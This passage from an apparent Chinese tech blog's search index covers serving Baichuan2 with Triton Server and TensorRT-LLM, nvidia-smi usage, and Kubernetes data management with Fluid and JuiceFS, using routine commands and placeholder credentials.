│ │ └── config.pbtxt │ ├── preprocessing │ │ ├── 1 │ │ │ ├── model.py │ │ │ └── __pycache__ │ │ │ └── model.cpython-310.pyc │ │ └── config.pbtxt │ └── tensorrt_llm │ ├── 1 │ │ ├── baichuan_float16_tp1_rank0.engine │ │ ├── config.json │ │ └── model.cache │ └── config.pbtxt └── downloads └── Baichuan2-7B-Chat ├── Baichuan2 模型社区许可协议.pdf ├── Community License for Baichuan2 Model.pdf ├── config.json ├── configuration_baichuan.py ├── generation_config.json ├── generation_utils.py ├── modeling_baichuan.py ├── pytorch_model.bin ├── quantizer.py ├── README.md ├── special_tokens_map.json ├── tokenization_baichuan.py ├── tokenizer_config.json └── tokenizer.model 13 directories, 26 files 3.3 启动推理服务 1 2 3 4 5 6 docker run --gpus device=0 --rm -p 38000:8000 -p 38001:8001 -p 38002:8002 \\ -v $PWD/modelops/triton-tensorrtllm:/models \\ hubimage/nvidia-triton-trt-llm:v0.7.1 \\ tritonserver --model-repository=/models/Baichuan2-7B-Chat \\ --disable-auto-complete-config \\ --backend-config=python,shm-region-prefix-name=prefix0_: 如果一台机器上运行了多个 triton server，那么需要用 shm-region-prefix-name=prefix0_ 区分一下共享内存的前缀，详情可以参考 https://github.com/triton-inference-server/server/issues/4145 。\n启动日志:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 I0129 10:27:31.658112 1 server.cc:619] +-------------+-----------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | Backend | Path | Config | +-------------+-----------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | python | /opt/tritonserver/backends/python/libtriton_python.so | {\u0026#34;cmdline\u0026#34;:{\u0026#34;auto-complete-config\u0026#34;:\u0026#34;false\u0026#34;,\u0026#34;backend-directory\u0026#34;:\u0026#34;/opt/tritonserver/backends\u0026#34;,\u0026#34;min-compute-capability\u0026#34;:\u0026#34;6.000000\u0026#34;,\u0026#34;shm-region-prefix-name\u0026#34;:\u0026#34;prefix0_:\u0026#34;,\u0026#34;default-max-batch-size\u0026#34;:\u0026#34;4\u0026#34;}} | | tensorrtllm | /opt/tritonserver/backends/tensorrtllm/libtriton_tensorrtllm.so | {\u0026#34;cmdline\u0026#34;:{\u0026#34;auto-complete-config\u0026#34;:\u0026#34;false\u0026#34;,\u0026#34;backend-directory\u0026#34;:\u0026#34;/opt/tritonserver/backends\u0026#34;,\u0026#34;min-compute-capability\u0026#34;:\u0026#34;6.000000\u0026#34;,\u0026#34;default-max-batch-size\u0026#34;:\u0026#34;4\u0026#34;}} | +-------------+-----------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ I0129 10:27:31.658192 1 server.cc:662] +----------------+---------+--------+ | Model | Version | Status | +----------------+---------+--------+ | ensemble | 1 | READY | | postprocessing | 1 | READY | | preprocessing | 1 | READY | | tensorrt_llm | 1 | READY | +----------------+---------+--------+ ... I0129 10:27:31.745587 1 grpc_server.cc:2513] Started GRPCInferenceService at 0.0.0.0:8001 I0129 10:27:31.745810 1 http_server.cc:4497] Started HTTPService at 0.0.0.0:8000 I0129 10:27:31.787129 1 http_server.cc:270] Started Metrics Service at 0.0.0.0:8002 四个模型都处于 READY 状态，就可以正常推理了。\n查看模型配置参数 1 2 3 curl localhost:38000/v2/models/ensemble/config {\u0026#34;name\u0026#34;:\u0026#34;ensemble\u0026#34;,\u0026#34;platform\u0026#34;:\u0026#34;ensemble\u0026#34;,\u0026#34;backend\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version_policy\u0026#34;:{\u0026#34;latest\u0026#34;:{\u0026#34;num_versions\u0026#34;:1}},\u0026#34;max_batch_size\u0026#34;:32,\u0026#34;input\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;text_input\u0026#34;,\u0026#34;data_type\u0026#34;:\u0026#34;TYPE_STRING\u0026#34;,... 可以查看模型的推理参数。如果使用的是 auto-complete-config，那么这个接口可以用于导出 Triton Server 自动生成的模型推理参数，用于修改和调试。\n查看 Triton 是否正常运行 1 2 3 4 5 curl -v localhost:38000/v2/health/ready \u0026lt; HTTP/1.1 200 OK \u0026lt; Content-Length: 0 \u0026lt; Content-Type: text/plain 3.4 客户端调用 安装依赖 1 pip install tritonclient[grpc] -i https://pypi.tuna.tsinghua.edu.cn/simple Triton GRPC 接口的性能显著高于 HTTP 接口，同时在容器中，我也没有找到 HTTP 接口的示例，这里就直接用 GRPC 了。\n推理测试 1 wget https://raw.githubusercontent.com/shaowenchen/modelops/master/triton-tensorrtllm/Baichuan2-7B-Chat/end_to_end_grpc_client.py 1 2 3 4 python3 ./end_to_end_grpc_client.py -u 127.0.0.1:38001 -p \u0026#34;世界上第三高的山峰是哪座？\u0026#34; -S -o 128 珠穆朗玛峰（Mount Everest）是世界上最高的山峰，海拔高度为8,848米（29,029英尺）。在世界上，珠穆朗玛峰之后，第二高的山峰是喀喇昆仑山脉的乔戈里峰（K2，又称K2峰），海拔高度为8,611米（28,251英尺）。第三高的山峰是喜马拉雅山脉的坎钦隆加峰（Kangchenjunga），海拔高度为8,586米（28,169英尺）。\u0026lt;/s\u0026gt; 3.5 查看指标 Triton Server 已经提供了推理指标，监听在 8002 端口。在本文的示例中，就是 38002 端口。\n1 2 3 4 5 6 7 8 9 10 11 12 curl -v localhost:38002/metrics nv_inference_request_success{model=\u0026#34;ensemble\u0026#34;,version=\u0026#34;1\u0026#34;} 1 nv_inference_request_success{model=\u0026#34;tensorrt_llm\u0026#34;,version=\u0026#34;1\u0026#34;} 1 nv_inference_request_success{model=\u0026#34;preprocessing\u0026#34;,version=\u0026#34;1\u0026#34;} 1 nv_inference_request_success{model=\u0026#34;postprocessing\u0026#34;,version=\u0026#34;1\u0026#34;} 128 # HELP nv_inference_request_failure Number of failed inference requests, all batch sizes # TYPE nv_inference_request_failure counter nv_inference_request_failure{model=\u0026#34;ensemble\u0026#34;,version=\u0026#34;1\u0026#34;} 0 nv_inference_request_failure{model=\u0026#34;tensorrt_llm\u0026#34;,version=\u0026#34;1\u0026#34;} 0 nv_inference_request_failure{model=\u0026#34;preprocessing\u0026#34;,version=\u0026#34;1\u0026#34;} 0 nv_inference_request_failure{model=\u0026#34;postprocessing\u0026#34;,version=\u0026#34;1\u0026#34;} 0 在 Grafana 中可以导入面板 https://grafana.com/grafana/dashboards/18737-triton-inference-server/ 查看指标，如下图:\n4. 总结 本文主要是在学习使用 TensorRT 和 Triton Server 进行推理过程的记录，主要内容如下:\nTensorRT 是一种针对 Nvidia GPU 硬件更高效的模型推理引擎 TensorRT-LLM 能让大模型更快使用上 TensorRT 引擎 Triton Server 是一个端到端的推理框架，支持大部分的模型框架，能帮助用户快速实现规模化的推理服务 Triton Server 下使用 TensorRT-LLM 进行推理的示例 5. 参考 https://mmdeploy.readthedocs.io/zh-cn/latest/tutorial/03_pytorch2onnx.html https://docs.nvidia.com/deeplearning/tensorrt/container-release-notes/running.html#running https://github.com/NVIDIA/TensorRT-LLM https://github.com/triton-inference-server/triton-tensorrtllm https://zhuanlan.zhihu.com/p/663748373 ","description":"","id":72,"section":"post","tags":["博文","AI","Triton","TensorRT"],"title":"容器下使用 Triton Server 和 TensorRT-LLM 进行大模型推理","uri":"https://www.chenshaowen.com/blog/using-triton-server-and-tensorrt-llm-under-container.html"},{"content":"1. 什么是 nvidia-smi nvidia-smi 全称是 NVIDIA System Management Interface，是 NVIDIA 提供的管理和监控 GPU 的接口。\nnvidia-smi 调用的是 NVML。NVML 全称是 NVIDIA Management Library，提供了一组 C API，用于 NVIDIA GPU 监控和管理的库。\n1.1 可查询的状态 ECC 错误计数 GPU 利用率 活动计算进程 时钟和 PState 温度和风扇速度 电源管理 硬件识别 1.2 可修改的状态 ECC 模式 ECC 复位 计算模式 持久模式 2. nvidia-smi 字段含义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 nvidia-smi +---------------------------------------------------------------------------------------+ | NVIDIA-SMI 535.129.03 Driver Version: 535.129.03 CUDA Version: 12.2 | |-----------------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |=========================================+======================+======================| | 0 NVIDIA A100-SXM4-80GB On | 00000000:27:00.0 Off | 0 | | N/A 32C P0 65W / 400W | 4MiB / 81920MiB | 0% Default | | | | Disabled | +-----------------------------------------+----------------------+----------------------+ | 1 NVIDIA A100-SXM4-80GB On | 00000000:2A:00.0 Off | 0 | | N/A 29C P0 63W / 400W | 4MiB / 81920MiB | 0% Default | | | | Disabled | +-----------------------------------------+----------------------+----------------------+ | 2 NVIDIA A100-SXM4-80GB On | 00000000:51:00.0 Off | 0 | | N/A 31C P0 74W / 400W | 34221MiB / 81920MiB | 0% Default | | | | Disabled | +-----------------------------------------+----------------------+----------------------+ | 3 NVIDIA A100-SXM4-80GB On | 00000000:57:00.0 Off | 0 | | N/A 33C P0 66W / 400W | 4MiB / 81920MiB | 0% Default | | | | Disabled | +-----------------------------------------+----------------------+----------------------+ | 4 NVIDIA A100-SXM4-80GB On | 00000000:9E:00.0 Off | 0 | | N/A 31C P0 60W / 400W | 4MiB / 81920MiB | 0% Default | | | | Disabled | +-----------------------------------------+----------------------+----------------------+ | 5 NVIDIA A100-SXM4-80GB On | 00000000:A4:00.0 Off | 0 | | N/A 29C P0 62W / 400W | 4MiB / 81920MiB | 0% Default | | | | Disabled | +-----------------------------------------+----------------------+----------------------+ | 6 NVIDIA A100-SXM4-80GB On | 00000000:C7:00.0 Off | 0 | | N/A 28C P0 64W / 400W | 4MiB / 81920MiB | 0% Default | | | | Disabled | +-----------------------------------------+----------------------+----------------------+ | 7 NVIDIA A100-SXM4-80GB On | 00000000:CA:00.0 Off | 0 | | N/A 33C P0 92W / 400W | 7MiB / 81920MiB | 72% Default | | | | Disabled | +-----------------------------------------+----------------------+----------------------+ +---------------------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=======================================================================================| | 2 N/A N/A 3085965 C /home/xxx/.conda/envs/chat/bin/python 34208MiB | +---------------------------------------------------------------------------------------+ 字段 说明 NVIDIA-SMI nvidia-smi 的版本号 Driver Version 驱动版本号 CUDA Version CUDA 版本号 GPU GPU 卡序号 GPU Name GPU 的名称和内存容量 Persistence-M 持久模式是否启用。On 表示启用, Off 表示关闭。启用时 GPU 将保持最大性能状态 Bus-Id GPU 所在的 PCIe 总线地址 Disp.A 显示器是否连接到 GPU 的输出端口。On 表示连接,Off 表示没有连接 Volatile Uncorr. ECC 未 corrected 错误的易失性 ECC 内存错误计数。用于检测内存错误 Fan 风扇速度, N/A 表示没有风扇或风扇速度读数 Temp GPU 温度 Perf 性能状态。P0 是最大性能状态, P8 是最小性能状态 Pwr Usage/Cap: 当前功耗和功耗上限 Memory-Usage 已用 GPU 显存/总 GPU 显存 GPU-Util GPU 利用率 Compute M. 计算模式。Default 是默认模式 MIG M. MIG(Multi-Instance GPU) 模式, 将一个物理 GPU 分成多个独立、隔离的实例。Disabled 表示未启用 字段 说明 GPU GPU 设备的 ID GI Global ID, 针对多 GPU 系统, 一个进程所有的 cuda context 的统一 ID CI Compute Instance ID, 属于同一个 GPU 进程内, 区分不同 cuda context 的 ID PID 进程 ID Type 进程类型, C 表示 CUDA 进程, G 表示 Graphics 进程 Process name 进程名称 GPU Memory Usage 该进程当前在 GPU 上占用的内存大小 3. 常用参数 nvidia-smi -l 定时刷新状态 每隔 5 秒刷新一次\n1 nvidia-smi -l 5 nvidia-smi -L 查看显卡型号 1 2 3 4 5 nvidia-smi -L GPU 0: NVIDIA A100-SXM4-80GB (UUID: GPU-x-8bff-5236-2111-x) GPU 1: NVIDIA A100-SXM4-80GB (UUID: GPU-x-2a64-20a8-8c5b-x) ... nvidia-smi -q 查看 GPU 的状态详情 可通过 -i 参数指定 GPU 序号，如果不指定，默认查询全部。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 nvidia-smi -q -i 0 ==============NVSMI LOG============== Driver Version : 535.129.03 CUDA Version : 12.2 Attached GPUs : 8 GPU 00000000:27:00.0 Product Name : NVIDIA A100-SXM4-80GB Product Brand : NVIDIA Product Architecture : Ampere Display Mode : Enabled Display Active : Disabled Persistence Mode : Enabled Addressing Mode : None MIG Mode Current : Disabled Pending : Disabled nvidia-smi -q -x 查询信息输出为 XML 格式 1 2 3 4 5 6 7 8 9 nvidia-smi -q -i 0 -x \u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE nvidia_smi_log SYSTEM \u0026#34;nvsmi_device_v12.dtd\u0026#34;\u0026gt; \u0026lt;nvidia_smi_log\u0026gt; \u0026lt;driver_version\u0026gt;535.129.03\u0026lt;/driver_version\u0026gt; \u0026lt;cuda_version\u0026gt;12.2\u0026lt;/cuda_version\u0026gt; \u0026lt;attached_gpus\u0026gt;8\u0026lt;/attached_gpus\u0026gt; ... \u0026lt;/nvidia_smi_log\u0026gt; nvidia-smi --query-gpu=gpu_name --format=csv 查询指定字段信息 --query-gpu 参数可以指定要查询的信息，--format 参数可以指定输出格式。\n1 2 3 4 5 6 7 8 9 10 nvidia-smi --query-gpu=temperature.gpu,utilization.gpu,utilization.memory,memory.total --format=csv,noheader 32, 0 %, 0 %, 81920 MiB 30, 0 %, 0 %, 81920 MiB 31, 0 %, 0 %, 81920 MiB 49, 72 %, 47 %, 81920 MiB 31, 0 %, 0 %, 81920 MiB 28, 0 %, 0 %, 81920 MiB 28, 0 %, 0 %, 81920 MiB 30, 0 %, 0 %, 81920 MiB nvidia-smi -q -d SUPPORTED_CLOCKS 查看 GPU 的时钟频率 通过 -i 参数指定 GPU 序号，如果不指定，则默认查询全部 GPU 的时钟频率。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 nvidia-smi -q -d SUPPORTED_CLOCKS -i 0 ==============NVSMI LOG============== Timestamp : Thu Feb 1 14:33:03 2024 Driver Version : 535.129.03 CUDA Version : 12.2 Attached GPUs : 8 GPU 00000000:27:00.0 Supported Clocks Memory : 1593 MHz Graphics : 1410 MHz Graphics : 1395 MHz Graphics : 1380 MHz Graphics : 1365 MHz Graphics : 1350 MHz Graphics : 1335 MHz Graphics : 1320 MHz 4. 常用子命令 nvidia-smi nvlink -s 查看 NVLink 网络状态 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 nvidia-smi nvlink -s GPU 0: NVIDIA A100-SXM4-80GB (UUID: GPU-d604695a-8bff-5236-2111-59cae59c2a48) Link 0: 25 GB/s Link 1: 25 GB/s Link 2: 25 GB/s Link 3: 25 GB/s Link 4: 25 GB/s Link 5: 25 GB/s Link 6: 25 GB/s Link 7: 25 GB/s Link 8: 25 GB/s Link 9: 25 GB/s Link 10: 25 GB/s Link 11: 25 GB/s nvidia-smi topo -m 查看连接拓扑 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 nvidia-smi topo -m GPU0\tGPU1\tGPU2\tGPU3\tGPU4\tGPU5\tGPU6\tGPU7\tNIC0\tCPU Affinity\tNUMA Affinity\tGPU NUMA ID GPU0\tX NV12\tNV12\tNV12\tNV12\tNV12\tNV12\tNV12\tSYS\t0-31,64-95\t0\tN/A GPU1\tNV12\tX NV12\tNV12\tNV12\tNV12\tNV12\tNV12\tSYS\t0-31,64-95\t0\tN/A GPU2\tNV12\tNV12\tX NV12\tNV12\tNV12\tNV12\tNV12\tSYS\t0-31,64-95\t0\tN/A GPU3\tNV12\tNV12\tNV12\tX NV12\tNV12\tNV12\tNV12\tSYS\t0-31,64-95\t0\tN/A GPU4\tNV12\tNV12\tNV12\tNV12\tX NV12\tNV12\tNV12\tSYS\t32-63,96-127\t1\tN/A GPU5\tNV12\tNV12\tNV12\tNV12\tNV12\tX NV12\tNV12\tSYS\t32-63,96-127\t1\tN/A GPU6\tNV12\tNV12\tNV12\tNV12\tNV12\tNV12\tX NV12\tSYS\t32-63,96-127\t1\tN/A GPU7\tNV12\tNV12\tNV12\tNV12\tNV12\tNV12\tNV12\tX SYS\t32-63,96-127\t1\tN/A NIC0\tSYS\tSYS\tSYS\tSYS\tSYS\tSYS\tSYS\tSYS\tX Legend: X = Self SYS = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI) NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node PHB = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU) PXB = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge) PIX = Connection traversing at most a single PCIe bridge NV# = Connection traversing a bonded set of # NVLinks NIC Legend: NIC0: mlx5_bond_0 NV12 表示有 12 根 NVLink，以每个 25 GB/s 的速率计算，这里 GPU 与 GPU 之间的互联速度达 300 GB/s。\n5. 常用配置命令 开启持久模式(已经被 nvidia-persistenced 守护进程替代) 可以通过 -i 参数指定 GPU 序号。\n1 nvidia-smi -pm 1 持久模式 persistence mode，即在没有应用使用 GPU 时，驱动也处于加载状态。\n持久模式比较耗电，但如果有短生命周期的任务，使用持久模式能够缩短 GPU 程序的启动延时。\n开启 ECC 模式，重启生效 可以通过 -i 参数指定 GPU 序号。\n1 nvidia-smi -e 1 如果关闭，使用 -e 0，需要重启才能生效。\n需要注意的是开启 ECC 之后，虽然能够避免内存错误，但是会损失 15-25% 的性能，同时显存也会减少一部分。\n设置计算模式 一共有三种计算模式：0/Default 多个进程共享，会有竞争和等待；2/Prohibited 禁用显卡；3/Exclusive 进程独占\nnvidia-smi -c 0 6. 常见异常处理 6.1 容器中执行 nvidia-smi 报错 错误信息 1 CUDA initialization: Unexpected error from cudaGetDeviceCount(). Did you run some cuda functions before calling NumCudaDevices() that might have already set an error? Error 36: API call is not supported in the installed CUDA driver 解决方式 设置环境变量\n1 LD_LIBRARY_PATH=/usr/local/cuda/lib64:/usr/lib/x86_64-linux-gnu:/usr/local/nvidia/lib 原因 容器中的 cuda 版本比较旧，cuda.so 匹配不上驱动，通过上面的 LD_LIBRARY_PATH 环境变量绕过旧版本的驱动。\n6.2 禁用某张显卡 查看卡的 PCI 位置 1 2 3 4 nvidia-smi --query-gpu=index,pci.bus_id --format=csv index, pci.bus_id 0, 00000000:18:00.0 第一列是卡的编号，第二列是卡的 PCI 位置。\n禁用指定的 GPU 卡 1 nvidia-smi drain -p 0000:18:00.0 -m 1 -m 1 表示驱逐状态，-m 0 表示关闭驱逐状态。执行完成之后，卡在 nvidia-smi 不可见，但在 lspci 中可见。\n查看卡的驱逐状态 1 nvidia-smi drain -p 0000:18:00.0 -q ","description":"","id":73,"section":"post","tags":["博文","AI","GPU","NVIDIA","硬件"],"title":"nvidia-smi 基本使用","uri":"https://www.chenshaowen.com/blog/basic-usage-of-nvidia-smi.html"},{"content":"1. Fluid 简介 下面是来源于 https://github.com/fluid-cloudnative/fluid 的 Fluid 的架构图:\nFluid 抽象了两个概念:\nDataset，数据集合，用户视角的抽象 Runtime，数据存储、加速等真实服务的抽象 Fluid 主要解决了传统缓存系统在 Kubernetes 上使用的问题:\n通过 CRD 对数据集合 Dataset 进行描述，提供生命周期管理 依赖于 Runtime 后端，通过 PVC 提供给 Kubernetes 集群应用本地化的分布式缓存服务 使用 Fluid 时的工作流程:\n定义 Dataset，设置好数据的访问凭证、存储位置、读写模式等 定义 Runtime，runtime controller 对同名的 Dataset 和 Runtime 进行自动绑定 AddOwner；接着创建 worker 配置 Runtime 相关的资源；创建 ${NAMESPACE}- 前缀的 PV 和同名的 PVC 当有 Pod 挂载 PVC 时，会先在节点上创建一个 fuse pod 并将 /runtime-mnt/juicefs/xxx 目录挂载到主机上，然后 Fluid 的 CSI Controller 将该目录挂载到 Pod 中。 Dataset 和 Runtime 的生命周期在 Fluid 的代码仓库有描述，参考 https://github.com/fluid-cloudnative/fluid/blob/master/docs/zh/dev/runtime_dev_guide.md\n下面是 Dataset 的生命周期\n下面是 Runtime 的生命周期\n使用时:\nPod 对挂载的文件目录请求都会转给 fuse pod，由 fuse 将文件 io 转为网络 io 访问后端的 runtime 存储。\n2. 部署 Fluid 创建命名空间 1 kubectl create ns fluid-system 添加 Helm Repo 1 2 helm repo add fluid https://fluid-cloudnative.github.io/charts helm repo update 部署 Fluid 1 helm install --namespace fluid-system fluid fluid/fluid --devel 由于我 format 使用的 juicefs client 版本为 juicefs version 1.1.1+2023-11-28.437f4e6，为了 work/fuse pod 中的镜像版本与之匹配（当然也可以配置），这里使用的是 --devel 版本，即目前的 1.0.0 内测版本。\n1 2 3 4 helm list --namespace fluid-system NAME NAMESPACE REVISION\tUPDATED STATUS CHART APP VERSION fluid\tfluid-system\t1 2024-01-25 21:48:14.902476965 +0800 CST\tdeployed\tfluid-1.0.0-alpha.17\t1.0.0-719fc87 查看 Pod 状态 1 2 3 4 5 6 7 8 9 10 11 12 13 kubectl -n fluid-system get pod NAME READY STATUS RESTARTS AGE csi-nodeplugin-fluid-b8k9l 2/2 Running 0 9m33s csi-nodeplugin-fluid-gzl6w 2/2 Running 0 9m33s csi-nodeplugin-fluid-p5whc 2/2 Running 0 9m33s csi-nodeplugin-fluid-pwplp 2/2 Running 0 9m33s csi-nodeplugin-fluid-xs9kc 2/2 Running 0 9m33s csi-nodeplugin-fluid-xwwlm 2/2 Running 0 9m33s dataset-controller-6978c55675-2rtdr 1/1 Running 0 9m33s fluid-webhook-76d4c5fd45-bbmw7 1/1 Running 0 9m33s fluidapp-controller-697656949c-487mv 1/1 Running 0 9m33s juicefsruntime-controller-fbf45c44f-vtlcf 1/1 Running 0 5m17s 3. 环境准备 启动一个 Redis 实例，提供给 JuiceFS 使用 1 mkdir -p /data/test/redis-data \u0026amp;\u0026amp; cd /data/test 1 nerdctl run -d --name redis --network host -v $PWD/redis-data:/data -e REDIS_PASSWORD=mypassword redis:6 配置 Redis 环境变量 1 2 3 4 export REDIS_IP=x.x.x.x export REDIS_PORT=6379 export REDIS_USER=default export REDIS_PASSWORD=mypassword 配置存储桶的环境变量 1 2 3 4 5 6 export ACCESS_KEY=xxx export SECRET_KEY=xxx export BUCKET=xxx export ENDPOINT=xxx export BUCKET_ENPOINT=$BUCKET.$ENDPOINT export PROVIDER=xxx 创建一个文件系统 1 2 3 4 5 6 export REDIS_DIRECTSERVER=redis://${REDIS_USER}:${REDIS_PASSWORD}@${REDIS_IP}:${REDIS_PORT}/1 juicefs format \\ --storage ${PROVIDER} \\ --bucket ${BUCKET_ENPOINT}\\ ${REDIS_DIRECTSERVER} \\ juicefs-direct-demo 文件系统需要提前初始化，否则在集群中使用时，会提示找不到 .stats 文件类似错误。\n设置一个测试的命名空间 1 export NAMESPACE=shaowen-test 【非必须】挂载文件系统到本地 1 juicefs mount -d --buffer-size 2000 --max-uploads 150 ${REDIS_DIRECTSERVER} ./${NAMESPACE}-direct --cache-dir=/data/jfs-${NAMESPACE} 【非必须】进入目录，创建一点测试文件 1 2 cd ${NAMESPACE}-direct echo \u0026#34;123\u0026#34; \u0026gt; test.txt 4. 配置 DatasSet 创建一个命名空间 1 kubectl create ns ${NAMESPACE} 创建 Secret 1 2 3 4 5 6 7 8 9 10 11 12 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Secret metadata: name: juicefs-direct-secret namespace: ${NAMESPACE} type: Opaque stringData: metaurl: redis://${REDIS_USER}:${REDIS_PASSWORD}@${REDIS_IP}:6379/1 access-key: ${ACCESS_KEY} secret-key: ${SECRET_KEY} EOF Redis 需要设置用户名，默认是 default，要明文指出。\n创建 Dataset 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: juicefs-direct-demo namespace: ${NAMESPACE} spec: accessModes: - ReadWriteMany mounts: - name: juicefs-direct-demo mountPoint: \u0026#34;juicefs:///\u0026#34; options: bucket: ${BUCKET_ENPOINT} storage: ${PROVIDER} encryptOptions: - name: metaurl valueFrom: secretKeyRef: name: juicefs-direct-secret key: metaurl - name: access-key valueFrom: secretKeyRef: name: juicefs-direct-secret key: access-key - name: secret-key valueFrom: secretKeyRef: name: juicefs-direct-secret key: secret-key EOF bucket 应该是 Bucket.Endpoint 的完整形式，而不能只填一个桶名。默认的 accessModes 为 ReadOnlyMany，即只读模式，这里改为 ReadWriteMany 。另外，这里配置挂载的是 JuiceFS 的 / 目录，在生产使用时，可以按照项目、应用维度挂载不同的子目录。\n查看 Dataset 1 2 3 4 kubectl -n ${NAMESPACE} get dataset NAME UFS TOTAL SIZE CACHED CACHE CAPACITY CACHED PERCENTAGE PHASE AGE juicefs-direct-demo NotBound 4s 此时还没有配置同名的 Runtime，因此状态为 NotBound。\n5. 配置 Runtime 创建 Runtime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: JuiceFSRuntime metadata: name: juicefs-direct-demo namespace: ${NAMESPACE} spec: replicas: 1 tieredstore: levels: - mediumtype: SSD path: /cache quota: 40960 # 40GiB low: \u0026#34;0.2\u0026#34; EOF 这里有很多参数可以配置，可以参考 https://github.com/fluid-cloudnative/fluid 对应分支 api 目录下 CRD 的定义说明。使用不同的 Fluid 版本，参数可能会有不同，注意区分。\n查看 Runtime 状态 1 2 3 4 kubectl -n ${NAMESPACE} get juicefsruntime NAME WORKER PHASE FUSE PHASE AGE juicefs-direct-demo Ready 96s 可能需要等待一会儿才能 Ready，因为需要创建 woker 。\n查看 Pod 状态 1 2 3 4 kubectl -n ${NAMESPACE} get pod NAME READY STATUS RESTARTS AGE juicefs-direct-demo-worker-0 1/1 Running 0 115s worker 无异常，正常运行。\n查看 Dataset 状态 1 2 3 4 kubectl -n ${NAMESPACE} get dataset NAME UFS TOTAL SIZE CACHED CACHE CAPACITY CACHED PERCENTAGE PHASE AGE juicefs-direct-demo 1.01GiB 40.00KiB Bound 33m 查看 PVC 1 2 3 4 kubectl -n shaowen-test get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE juicefs-direct-demo Bound shaowen-test-juicefs-direct-demo 100Pi RWX fluid 5m21s RWX 表示 ReadWriteMany，即读写模式。\n6. 创建负载 创建负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: juicefs-direct-demo namespace: ${NAMESPACE} spec: containers: - name: demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data/jfs name: data volumes: - name: data persistentVolumeClaim: claimName: juicefs-direct-demo EOF 查看负载 1 2 3 4 5 6 kubectl -n ${NAMESPACE} get pod juicefs-direct-demo NAME READY STATUS RESTARTS AGE juicefs-direct-demo 1/1 Running 0 52m juicefs-direct-demo-fuse-mkz4x 1/1 Running 0 52m juicefs-direct-demo-worker-0 1/1 Running 0 54m 进入负载查看数据目录 1 2 3 4 5 6 7 8 9 10 11 12 kubectl -n ${NAMESPACE} exec -it juicefs-direct-demo bash ls -al /data/jfs/ total 7 drwxrwxrwx 2 root root 4096 Jan 25 12:33 . drwxr-xr-x 3 root root 25 Jan 25 12:53 .. -r-------- 1 root root 0 Jan 25 12:53 .accesslog -r-------- 1 root root 1627 Jan 25 12:53 .config -r--r--r-- 1 root root 0 Jan 25 12:53 .stats dr-xr-xr-x 2 root root 0 Jan 25 12:53 .trash -rw-r--r-- 1 root root 4 Jan 25 12:33 test.txt 简单跑下 benchmark 在 Pod 中挂载了 JuiceFS 的目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 juicefs bench --block-size 4096 --big-file-size 1024 --threads 5 ./ +------------------+------------------+---------------+ | ITEM | VALUE | COST | +------------------+------------------+---------------+ | Write big file | 207.88 MiB/s | 24.63 s/file | | Read big file | 761.77 MiB/s | 6.72 s/file | | Write small file | 136.8 files/s | 36.56 ms/file | | Read small file | 293.7 files/s | 17.03 ms/file | | Stat file | 9007.3 files/s | 0.56 ms/file | | FUSE operation | 89312 operations | 0.97 ms/op | | Update meta | 1595 operations | 1.57 ms/op | | Put object | 1780 operations | 111.32 ms/op | | Get object | 1780 operations | 75.37 ms/op | +------------------+------------------+---------------+ ","description":"","id":74,"section":"post","tags":["博文","Fluid","JuiceFS","AI","Data"],"title":"使用 Fluid 和 JuiceFS 在 Kubernetes 管理数据","uri":"https://www.chenshaowen.com/blog/managing-data-in-kubernetes-using-fluid-and-juicefs.html"},{"content":" 请注意文中的 --block-size 4096 为 4GB，如果使用 --block-size 4 会更合理，在写数据性能上会更好。\n1. 环境准备 进入一个安全目录 1 mkdir -p /data/test \u0026amp;\u0026amp; cd /data/test 在这个目录下完成全部的测试任务。\n给 Redis 单独建一个目录 1 mkdir redis-data 建议新建一个目录，因为 Redis 会将当前目录文件的 Owner 改成 systemd-coredump。如果是 HOME 目录下，可能会导致 SSH 验证失败，无法登录机器。\n启动 Redis，提供给 JuiceFS 使用 1 nerdctl run -d --name redis --network host -v $PWD/redis-data:/data -e REDIS_PASSWORD=mypassword redis:6 配置 Redis 环境变量 1 2 3 4 export REDIS_IP=x.x.x.x export REDIS_PORT=6379 export REDIS_USER=default export REDIS_PASSWORD=mypassword 设置对象存储的环境变量 1 2 3 4 5 export ACCESS_KEY=xxx export SECRET_KEY=xxx export BUCKET=xxx export ENDPOINT=xxx 